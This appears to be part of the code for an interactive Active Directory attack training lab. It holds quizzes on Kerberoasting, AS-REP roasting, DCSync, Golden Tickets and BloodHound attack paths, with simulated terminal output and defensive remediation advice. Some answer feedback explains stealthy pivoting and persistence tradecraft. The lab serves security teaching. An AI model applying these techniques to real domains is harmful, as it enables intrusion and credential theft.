+          <text class="bh-label" x="540" y="58" fill="#7f1d1d" font-size="7">HIGH VALUE</text>
+        </g>
+        <!-- Domain Admins -->
+        <g class="bh-node" id="n-da" onclick="selectNode('da')">
+          <circle cx="700" cy="100" r="24" fill="#2a1015" stroke="#ef4444" stroke-width="2.5"/>
+          <text class="bh-label" x="700" y="97" fill="#f87171" font-size="7">Domain</text>
+          <text class="bh-label" x="700" y="107" fill="#f87171" font-size="7">Admins</text>
+        </g>
+        <!-- DB01 -->
+        <g class="bh-node" id="n-db01" onclick="selectNode('db01')">
+          <circle cx="700" cy="220" r="20" fill="#1a2035" stroke="#9333ea"/>
+          <text class="bh-label" x="700" y="217" fill="#c084fc" font-size="7">DB01</text>
+          <text class="bh-label" x="700" y="227" fill="#6b21a8" font-size="7">COMPUTER</text>
+        </g>
+        <!-- DC01 (target) -->
+        <g class="bh-node" id="n-dc01" onclick="selectNode('dc01')">
+          <circle cx="820" cy="150" r="26" fill="#2a1015" stroke="#ef4444" stroke-width="3"/>
+          <text class="bh-label" x="820" y="147" fill="#f87171" font-size="8">DC01</text>
+          <text class="bh-label" x="820" y="159" fill="#7f1d1d" font-size="7">TARGET</text>
+        </g>
+      </svg>
+    </div>
+
+    <!-- Node info panel -->
+    <div class="node-info-panel" id="nodeInfo">Click any node in the graph to inspect its properties and relationships.</div>
+
+    <!-- Exercise 6.1 — Critical Path -->
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 6.1 — Identify the Critical Attack Path</div>
+      <p class="exercise-prompt">
+        Using the BloodHound graph above, select the correct ordered sequence of the shortest path from
+        <strong>jsmith</strong> (owned) to <strong>DC01</strong> (Domain Controller). Click steps in order:
+      </p>
+      <div id="path-steps">
+        <div class="path-step" id="ps0" onclick="selectPath(0)"><span class="step-num">?</span> jsmith &rarr; IT-Support-SG (MemberOf) &rarr; WS-042 (AdminTo) &rarr; karen.admin (HasSession) &rarr; Domain Admins &rarr; DC01</div>
+        <div class="path-step" id="ps1" onclick="selectPath(1)"><span class="step-num">?</span> jsmith &rarr; HR-Users (MemberOf) &rarr; WS-042 (AdminTo) &rarr; DC01</div>
+        <div class="path-step" id="ps2" onclick="selectPath(2)"><span class="step-num">?</span> jsmith &rarr; svc_mssql &rarr; DB01 (LocalAdmin) &rarr; DC01</div>
+        <div class="path-step" id="ps3" onclick="selectPath(3)"><span class="step-num">?</span> helpdesk.svc &rarr; Domain Admins &rarr; DC01</div>
+      </div>
+      <div class="result-box" id="s6-r1"></div>
+    </div>
+
+    <!-- Exercise 6.2 -->
+    <div class="exercise-card">
+      <div class="exercise-title">Exercise 6.2 — Choke Point Remediation</div>
+      <p class="exercise-prompt">
+        The critical path runs through <strong>WS-042</strong> because karen.admin has an active session there.
+        Which two actions would most effectively break this attack path? Select TWO:
+      </p>
+      <div class="option-list">
+        <label class="option-item"><input type="checkbox" name="s6e2" value="a"> Remove jsmith from IT-Support-SG (or remove IT-Support-SG's AdminTo right on WS-042)</label>
+        <label class="option-item"><input type="checkbox" name="s6e2" value="b"> Enforce that karen.admin only authenticates from PAWs — no sessions on standard workstations</label>
+        <label class="option-item"><input type="checkbox" name="s6e2" value="c"> Rename the Domain Admins group</label>
+        <label class="option-item"><input type="checkbox" name="s6e2" value="d"> Disable jsmith's account</label>
+      </div>
+      <button class="check-btn" onclick="checkS6E2()">Verify</button>
+      <div class="result-box" id="s6-r2"></div>
+    </div>
+
+    <div class="defense-box">
+      <div class="defense-header">How to Defend — Attack Path Reduction</div>
+      <ul class="defense-list">
+        <li>Run <strong>BloodHound yourself</strong> — continuous attack path analysis as a defensive tool. The free BloodHound CE and Bloodhound Enterprise both offer automated path enumeration</li>
+        <li>Enforce <strong>Tiered Administration</strong> (Microsoft Tier 0/1/2 model) — Tier 0 accounts (DA, EA, DC) never authenticate to Tier 1 or Tier 2 systems</li>
+        <li>Eliminate <strong>local admin rights</strong> from non-IT users — lateral movement through HasSession depends on admin access to the session-hosting machine</li>
+        <li>Implement <strong>Credential Guard</strong> on all workstations — prevents LSASS credential extraction, blocking HasSession abuse</li>
+        <li>Audit <strong>group memberships</strong> quarterly and remove stale nested memberships — attackers exploit access paths that even the AD team forgot existed</li>
+      </ul>
+    </div>
+
+    <!-- Final complete -->
+    <button class="complete-btn" id="finalComplete" onclick="completeLab()">Mark Lab Complete — Submit Report</button>
+  </section>
+
+</main>
+
+<!-- ================================================================
+     JAVASCRIPT
+     ================================================================ -->
+<script>
+  /* ----------------------------------------------------------------
+     STATE
+     ---------------------------------------------------------------- */
+  const state = {
+    currentStage: 0,
+    stagesUnlocked: [true, false, false, false, false, false],
+    stageComplete: [false, false, false, false, false, false],
+    // Track which exercises have been correctly answered per stage
+    s1: { e1: false, e2: false },
+    s2: { e1: false, e2: false },
+    s3: { e1: false, e2: false },
+    s4: { e1: false, e2: false },
+    s5: { e1: false, e2: false },
+    s6: { e1: false, e2: false }
+  };
+
+  /* ----------------------------------------------------------------
+     STAGE NAVIGATION
+     ---------------------------------------------------------------- */
+  function goToStage(idx) {
+    if (!state.stagesUnlocked[idx]) return;
+    state.currentStage = idx;
+
+    document.querySelectorAll('.stage-panel').forEach((p, i) => {
+      p.classList.toggle('active', i === idx);
+    });
+    document.querySelectorAll('.stage-tab').forEach((t, i) => {
+      t.classList.toggle('active', i === idx);
+    });
+
+    updatePips();
+  }
+
+  function advanceStage(fromIdx) {
+    const nextIdx = fromIdx + 1;
+    if (nextIdx >= 6) return;
+
+    state.stagesUnlocked[nextIdx] = true;
+    state.stageComplete[fromIdx] = true;
+
+    const tab = document.getElementById('tab' + nextIdx);
+    if (tab) {
+      tab.classList.remove('locked');
+    }
+
+    // Mark current tab as done
+    document.getElementById('tab' + fromIdx).classList.add('done');
+
+    updatePips();
+    goToStage(nextIdx);
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  function updatePips() {
+    for (let i = 0; i < 6; i++) {
+      const pip = document.getElementById('pip' + i);
+      if (!pip) continue;
+      pip.classList.remove('active', 'done');
+      if (state.stageComplete[i])     pip.classList.add('done');
+      else if (i === state.currentStage) pip.classList.add('active');
+    }
+    document.getElementById('stageLabel').textContent =
+      'Stage ' + (state.currentStage + 1) + ' / 6';
+  }
+
+  /* ----------------------------------------------------------------
+     HELPER — show result
+     ---------------------------------------------------------------- */
+  function showResult(id, ok, msg) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.className = 'result-box ' + (ok ? 'ok' : 'err');
+    el.textContent = msg;
+    el.style.display = 'block';
+  }
+
+  /* ----------------------------------------------------------------
+     CHECK ADVANCE BUTTON — enable when both exercises done
+     ---------------------------------------------------------------- */
+  function checkAdvanceReady(stageIdx, stageKey) {
+    const s = state[stageKey];
+    const allDone = Object.values(s).every(v => v === true);
+    if (allDone) {
+      const btn = document.getElementById('adv' + stageIdx);
+      if (btn) btn.classList.add('ready');
+    }
+  }
+
+  function checkFinalReady() {
+    const s = state.s6;
+    if (s.e1 && s.e2) {
+      const btn = document.getElementById('finalComplete');
+      if (btn) btn.classList.add('ready');
+    }
+  }
+
+  /* ----------------------------------------------------------------
+     STAGE 1 — RECON
+     ---------------------------------------------------------------- */
+
+  /* Simulated terminal for stage 1 */
+  const s1Commands = {
+    'get-aduser': {
+      output: `<span class="t-white">Name           SamAccountName  ServicePrincipalName                    </span>
+<span class="t-dim">----           --------------  --------------------                    </span>
+<span class="t-white">John Smith     jsmith          </span>
+<span class="t-key">SQL Service    svc_mssql       MSSQLSvc/db01.corp.local:1433</span>
+<span class="t-key">Backup Svc     svc_backup      MSServerBU/backup01.corp.local</span>
+<span class="t-white">Karen Mills    karen.admin     </span>
+<span class="t-key">Web App Svc    svc_web         HTTP/intranet.corp.local:8080</span>
+<span class="t-white">Tom Renner     tom.it          </span>
+<span class="t-dim">[*] 6 user objects returned. 3 accounts have registered SPNs.</span>`
+    },
+    'get-adgroup': {
+      output: `<span class="t-white">Name                         DistinguishedName</span>
+<span class="t-dim">----                         -----------------</span>
+<span class="t-white">Domain Admins                CN=Domain Admins,CN=Users,DC=corp,DC=local</span>
+<span class="t-white">Enterprise Admins            CN=Enterprise Admins,CN=Users,DC=corp,DC=local</span>
+<span class="t-white">IT-Replication-SG            CN=IT-Replication-SG,OU=Groups,DC=corp,DC=local</span>
+<span class="t-white">IT-Support                   CN=IT-Support,OU=Groups,DC=corp,DC=local</span>
+<span class="t-white">Backup Operators             CN=Backup Operators,CN=Builtin,DC=corp,DC=local</span>
+<span class="t-dim">[*] 5 groups with Admin in name. IT-Replication-SG has DCSync rights — verify!</span>`
+    },
+    'get-adcomputer': {
+      output: `<span class="t-white">Name     OperatingSystem                 IPv4Address</span>
+<span class="t-dim">----     ---------------                 -----------</span>
+<span class="t-white">DC01     Windows Server 2022 Datacenter  10.0.0.5</span>
+<span class="t-white">DC02     Windows Server 2022 Datacenter  10.0.0.6</span>
+<span class="t-white">FS01     Windows Server 2019 Standard    10.0.0.20</span>
+<span class="t-white">DB01     Windows Server 2019 Standard    10.0.0.21</span>
+<span class="t-white">WS-042   Windows 11 Enterprise           10.0.1.42</span>
+<span class="t-dim">[*] 312 total computer objects. Showing domain controllers + key servers.</span>`
+    },
+    'bloodhound': {
+      output: `<span class="t-dim">INFO: Found AD domain: corp.local</span>
+<span class="t-dim">INFO: Connecting to LDAP server: dc01.corp.local</span>
+<span class="t-dim">INFO: Found 1 domains</span>
+<span class="t-dim">INFO: Found 2 domain controllers</span>
+<span class="t-white">INFO: Found 847 users</span>
+<span class="t-white">INFO: Found 312 computers</span>
+<span class="t-white">INFO: Found 94 groups</span>
+<span class="t-key">INFO: Found 14 GPO links</span>
+<span class="t-key">INFO: Done in 00M 47S</span>
+<span class="t-white">INFO: Compressing output into 20250115173022_BloodHound.zip</span>`
+    }
+  };
+
+  document.getElementById('s1-input').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') runS1Command();
+  });
+
+  function fillCmd(cmd) {
+    document.getElementById('s1-input').value = cmd;
+    document.getElementById('s1-input').focus();
+  }
+
+  function runS1Command() {
+    const input = document.getElementById('s1-input');
+    const raw = input.value.trim();
+    if (!raw) return;
+
+    const out = document.getElementById('s1-term-output');
+    const cmdLine = `\n<span class="t-prompt">PS C:\\&gt;</span> <span class="t-cmd">${escapeHtml(raw)}</span>\n`;
+    let responseHtml = '';
+
+    const lower = raw.toLowerCase();
+    if (lower.includes('get-aduser')) {
+      responseHtml = s1Commands['get-aduser'].output;
+    } else if (lower.includes('get-adgroup')) {
+      responseHtml = s1Commands['get-adgroup'].output;
+    } else if (lower.includes('get-adcomputer')) {
+      responseHtml = s1Commands['get-adcomputer'].output;
+    } else if (lower.includes('bloodhound')) {
+      responseHtml = s1Commands['bloodhound'].output;
+    } else {
+      responseHtml = `<span class="t-err">CommandNotFoundException: '${escapeHtml(raw)}' is not recognized. Try one of the available commands.</span>`;
+    }
+
+    out.innerHTML += cmdLine + responseHtml + '\n';
+    input.value = '';
+    out.scrollTop = out.scrollHeight;
+  }
+
+  function escapeHtml(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  }
+
+  function checkS1E1() {
+    const checked = Array.from(document.querySelectorAll('input[name="s1e1"]:checked')).map(i => i.value);
+    const correct = ['svc_mssql', 'svc_backup', 'svc_web'];
+    const ok = correct.every(v => checked.includes(v)) && checked.length === correct.length;
+
+    document.querySelectorAll('input[name="s1e1"]').forEach(inp => {
+      const label = inp.closest('.option-item');
+      if (correct.includes(inp.value)) label.classList.add('correct');
+      else if (checked.includes(inp.value)) label.classList.add('wrong');
+    });
+
+    if (ok) {
+      showResult('s1-r1', true, 'Correct. The three accounts with registered SPNs are Kerberoastable: svc_mssql, svc_backup, svc_web. karen.admin is high-value but has no SPN — target via credential attack, not Kerberoasting.');
+      state.s1.e1 = true;
+      checkAdvanceReady(0, 's1');
+    } else {
+      showResult('s1-r1', false, 'Incorrect. Kerberoastable = has a registered SPN. Only accounts with SPNs appear in the TGS request response. karen.admin has no SPN. jsmith has no SPN.');
+    }
+  }
+
+  function checkS1E2() {
+    const val = document.querySelector('input[name="s1e2"]:checked')?.value;
+    if (val === 'b') {
+      showResult('s1-r2', true, 'Correct. Domain Admins hold Replicating Directory Changes All by default, enabling DCSync. Enterprise Admins also hold this right. Other groups listed do not.');
+      state.s1.e2 = true;
+      checkAdvanceReady(0, 's1');
+    } else {
+      showResult('s1-r2', false, 'Incorrect. Domain Admins (and Enterprise Admins) hold the DS-Replication-Get-Changes-All extended right that enables DCSync. Backup Operators and Remote Desktop Users do not.');
+    }
+  }
+
+  /* ----------------------------------------------------------------
+     STAGE 2 — KERBEROASTING
+     ---------------------------------------------------------------- */
+  function checkS2E1() {
+    const val = document.querySelector('input[name="s2e1"]:checked')?.value;
+    if (val === 'b') {
+      showResult('s2-r1', true, 'Correct. Using the service account to connect to its own service (SQL) and pivot from there is stealthy — it looks like normal service activity. Interactive logon as a service account triggers additional alerting and is operationally noisy.');
+      state.s2.e1 = true;
+      checkAdvanceReady(1, 's2');
+    } else {
+      showResult('s2-r1', false, 'Incorrect. Interactive logon as svc_mssql would generate Event ID 4648 (explicit credential logon) and potentially alert. The stealthy path leverages the account within its expected service context.');
+    }
+  }
+
+  function checkS2E2() {
+    const val = document.querySelector('input[name="s2e2"]:checked')?.value;
+    if (val === 'b') {
+      showResult('s2-r2', true, 'Correct. RC4 encryption (etype 23) uses MD4-based NTLM key derivation, which is computationally weak. An RTX 4090 can attempt ~1 billion RC4 TGS passwords/second versus ~2 million AES256 attempts/second — a 500x speed difference.');
+      state.s2.e2 = true;
+      checkAdvanceReady(1, 's2');
+    } else {
+      showResult('s2-r2', false, 'Incorrect. The key factor is computational cost. RC4 key derivation is orders of magnitude weaker than AES256-HMAC-SHA1, making offline cracking dramatically faster for RC4 tickets.');
+    }
+  }
+
+  /* ----------------------------------------------------------------
+     STAGE 3 — AS-REP ROASTING
+     ---------------------------------------------------------------- */
+  function checkS3E1() {
+    const val = document.querySelector('input[name="s3e1"]:checked')?.value;
+    if (val === 'b') {
+      showResult('s3-r1', true, 'Correct. The UF_DONT_REQUIRE_PREAUTH flag (value 0x400000) in the userAccountControl attribute is what makes an account vulnerable. When set, the KDC will respond to AS-REQ without verifying the client knows the account password.');
+      state.s3.e1 = true;
+      checkAdvanceReady(2, 's3');
+    } else {
+      showResult('s3-r1', false, 'Incorrect. The userAccountControl flag UF_DONT_REQUIRE_PREAUTH controls pre-authentication requirement. SPNs are relevant to Kerberoasting, not AS-REP Roasting.');
+    }
+  }
+
+  function checkS3E2() {
+    const checked = Array.from(document.querySelectorAll('input[name="s3e2"]:checked')).map(i => i.value);
+    const correct = ['a', 'c'];
+    const ok = correct.every(v => checked.includes(v)) && checked.length === correct.length;
+
+    if (ok) {
+      showResult('s3-r2', true, 'Correct. GenericWrite allows: (a) Writing arbitrary SPNs to the target — enabling Targeted Kerberoasting, and (c) Setting DONT_REQ_PREAUTH on the target — enabling Targeted AS-REP Roasting. Option (b) requires ForceChangePassword or ResetPassword rights, not GenericWrite alone.');
+      state.s3.e2 = true;
+      checkAdvanceReady(2, 's3');
+    } else {
+      showResult('s3-r2', false, 'Incorrect. GenericWrite grants write access to non-protected attributes. It enables targeted Kerberoasting (write SPN) and targeted AS-REP Roasting (set DONT_REQ_PREAUTH), but NOT direct password reset — that requires ForceChangePassword right.');
+    }
+  }
+
+  /* ----------------------------------------------------------------
+     STAGE 4 — DCSYNC
+     ---------------------------------------------------------------- */
+  function checkS4E1() {
+    const val = document.querySelector('input[name="s4e1"]:checked')?.value;
+    if (val === 'b') {
+      showResult('s4-r1', true, 'Correct. The krbtgt hash is the ultimate persistence mechanism — forge a Golden Ticket that survives password resets of individual accounts. Establish durable access before proceeding with objectives.');
+      state.s4.e1 = true;
+      checkAdvanceReady(3, 's4');
+    } else {
+      showResult('s4-r1', false, 'Incorrect. Establishing persistence via Golden Ticket (forged with krbtgt hash) is the highest-priority post-DCSync action. It survives account lockouts and password resets on all other accounts.');
+    }
+  }
+
+  function checkS4E2() {
+    const checked = Array.from(document.querySelectorAll('input[name="s4e2"]:checked')).map(i => i.value);
+    const correct = ['a', 'd'];
+    const ok = correct.every(v => checked.includes(v)) && checked.length === correct.length;
+
+    if (ok) {
+      showResult('s4-r2', true, 'Correct. Event ID 4662 with the DS-Replication-Get-Changes-All GUID firing from a non-DC source is the primary DCSync indicator. Event ID 4929 (replication source removed) can also appear during DCSync operations that manipulate replication topology.');
+      state.s4.e2 = true;
+      checkAdvanceReady(3, 's4');
+    } else {
+      showResult('s4-r2', false, 'Incorrect. Event ID 4662 (with the correct access GUID) from a non-DC object is the key DCSync indicator. Event ID 4624 (logon) and 4742 (computer account change) are not DCSync-specific.');
+    }
+  }
+
+  /* ----------------------------------------------------------------
+     STAGE 5 — GOLDEN / SILVER TICKETS
+     ---------------------------------------------------------------- */
+  function checkS5E1() {
+    const val = document.querySelector('input[name="s5e1"]:checked')?.value;
+    if (val === 'b') {
+      showResult('s5-r1', true, 'Correct. A Golden Ticket uses the krbtgt hash to forge a TGT (not a TGS). The forged TGT can then be used to request TGS tickets for any service across the domain — full domain-level access.');
+      state.s5.e1 = true;
+      checkAdvanceReady(4, 's5');
+    } else {
+      showResult('s5-r1', false, 'Incorrect. A Golden Ticket forges a TGT using the krbtgt hash. It grants access to any service in the domain. A Silver Ticket uses a service account hash to forge a service-specific TGS.');
+    }
+  }
+
+  function checkS5E2() {
+    const checked = Array.from(document.querySelectorAll('input[name="s5e2"]:checked')).map(i => i.value);
+    const correct = ['a', 'b', 'd'];
+    const ok = correct.every(v => checked.includes(v)) && checked.length === correct.length;
+
+    if (ok) {
+      showResult('s5-r2', true, 'Correct. (a) krbtgt must be rotated TWICE — the DC stores the previous password version; one reset is insufficient. (b) Monitoring for TGT lifetimes exceeding the policy maximum catches forged tickets with inflated validity. (d) Non-existent users (SID-only in PAC, no matching directory object) is a Golden Ticket signature.');
+      state.s5.e2 = true;
+      checkAdvanceReady(4, 's5');
+    } else {
+      showResult('s5-r2', false, 'Incorrect. A single krbtgt rotation is insufficient — the domain retains the previous password. Correct remediation requires two rotations, TGT lifetime monitoring, and detection of phantom user tickets.');
+    }
+  }
+
+  /* ----------------------------------------------------------------
+     STAGE 6 — BLOODHOUND
+     ---------------------------------------------------------------- */
+
+  /* Node info data */
+  const nodeData = {
+    jsmith:    { label: 'jsmith', type: 'User — OWNED', detail: 'Low-privilege domain user. Member of IT-Support-SG. Credentials: Welcome1! (phished). Starting foothold.' },
+    helpdesk:  { label: 'helpdesk.svc', type: 'User — OWNED', detail: 'Service account. AS-REP Roastable. Cracked password: Helpdesk123. Has GenericWrite over HR-Users OU (14 user objects).' },
+    itsupport: { label: 'IT-Support-SG', type: 'Security Group', detail: 'IT support group. Has AdminTo rights on WS-042 and 12 other workstations. jsmith is a member.' },
+    hrusers:   { label: 'HR-Users', type: 'Security Group', detail: 'HR department group. helpdesk.svc has GenericWrite here, enabling targeted Kerberoasting of HR accounts.' },
+    ws042:     { label: 'WS-042', type: 'Computer — Windows 11', detail: 'IT-Support-SG has local admin. CRITICAL: karen.admin has an active RDP session here. Pivot point for credential theft.' },
+    mssql:     { label: 'svc_mssql', type: 'User — OWNED', detail: 'SQL service account. Kerberoasted password: Sqlserver2019!. LocalAdmin on DB01. Sysadmin on SQL Server.' },
+    karen:     { label: 'karen.admin', type: 'User — HIGH VALUE', detail: 'Domain Admin group member. Active session on WS-042. If admin session credentials extracted from WS-042 memory — full domain compromise.' },
+    da:        { label: 'Domain Admins', type: 'Security Group — CRITICAL', detail: 'Tier 0 group. Members have full control of the domain. AdminTo on all DCs. Contains: karen.admin, 3 other users.' },
+    db01:      { label: 'DB01', type: 'Computer — Windows Server 2019', detail: 'Database server. svc_mssql is local admin. Potential pivot — if DB01 has admin session or trust to DC01.' },
+    dc01:      { label: 'DC01', type: 'Computer — Domain Controller (TARGET)', detail: 'Primary domain controller. Domain Admins have full AdminTo. Compromise = domain compromise. IP: 10.0.0.5.' }
+  };
+
+  let selectedNode = null;
+
+  function selectNode(id) {
+    if (selectedNode) {
+      const prev = document.getElementById('n-' + selectedNode);
+      if (prev) prev.classList.remove('selected');
+    }
+    selectedNode = id;
+    const curr = document.getElementById('n-' + id);
+    if (curr) curr.classList.add('selected');
+
+    const d = nodeData[id];
+    if (d) {
+      document.getElementById('nodeInfo').innerHTML =
+        '<strong>' + d.label + '</strong> — ' + d.type + '<br><span style="font-size:0.78rem;color:var(--muted)">' + d.detail + '</span>';
+    }
+  }
+
+  let selectedPathIdx = null;
+
+  function selectPath(idx) {
+    // Reset all
+    document.querySelectorAll('.path-step').forEach((el, i) => {
+      el.classList.remove('selected-step', 'correct-step');
+      el.querySelector('.step-num').textContent = '?';
+    });
+
+    selectedPathIdx = idx;
+    const el = document.getElementById('ps' + idx);
+    if (el) {
+      el.classList.add('selected-step');
+      el.querySelector('.step-num').textContent = (idx + 1);
+    }
+
+    // Correct answer is path 0 (jsmith -> IT-Support -> WS-042 -> karen.admin session -> DA -> DC01)
+    if (idx === 0) {
+      el.classList.remove('selected-step');
+      el.classList.add('correct-step');
+      showResult('s6-r1', true,
+        'Correct. The critical path is: jsmith (MemberOf) IT-Support-SG (AdminTo) WS-042 (HasSession: karen.admin) (MemberOf) Domain Admins (AdminTo) DC01. The HasSession edge is the critical choke point — karen.admin\'s active session on a workstation that jsmith can admin means LSASS extraction yields DA credentials.');
+      state.s6.e1 = true;
+      checkFinalReady();
+    } else {
+      showResult('s6-r1', false,
+        'Incorrect. That path either skips critical relationship edges or is not the shortest path to DC01. Examine the HasSession edge from WS-042 to karen.admin — this is the critical lateral movement node.');
+    }
+  }
+
+  function checkS6E2() {
+    const checked = Array.from(document.querySelectorAll('input[name="s6e2"]:checked')).map(i => i.value);
+    const correct = ['a', 'b'];
+    const ok = correct.every(v => checked.includes(v)) && checked.length === correct.length;
+
+    if (ok) {
+      showResult('s6-r2', true,
+        'Correct. Breaking the path requires: (a) removing the AdminTo edge (jsmith or IT-Support-SG should not have local admin on WS-042) AND (b) preventing DA sessions on Tier 2 workstations via tiered administration policy. Both edges must be severed.');
+      state.s6.e2 = true;
+      checkFinalReady();
+    } else {
+      showResult('s6-r2', false,
+        'Incorrect. Renaming groups or disabling jsmith hides the problem but does not fix the underlying access misconfiguration. The two structural fixes are: remove the AdminTo right, and enforce tiered admin (no DA sessions on workstations).');
+    }
+  }
+
+  /* ----------------------------------------------------------------
+     LAB COMPLETION
+     ---------------------------------------------------------------- */
+  function completeLab() {
+    const btn = document.getElementById('finalComplete');
+    if (!btn.classList.contains('ready')) return;
+
+    btn.textContent = 'Submitting engagement report...';
+    btn.disabled = true;
+
+    setTimeout(() => {
+      if (typeof ModuleProgress !== 'undefined') {
+        ModuleProgress.complete('dark-arts', 'da-ad-attack-lab', {
+          returnUrl: '../../index.html'
+        });
+      } else {
+        // Fallback if ModuleProgress not loaded (dev/preview)
+        alert('Lab complete! ModuleProgress.complete() would fire here in production.');
+        window.location.href = '../../index.html';
+      }
+    }, 800);
+  }
+
+  /* ----------------------------------------------------------------
+     INIT
+     ---------------------------------------------------------------- */
+  function init() {
+    updatePips();
+    // Set initial advance button state for stage 0 (locked until exercises pass)
+    // All advance buttons start non-ready (set via CSS opacity)
+  }
+
+  init();
+</script>
+</body>
+</html>
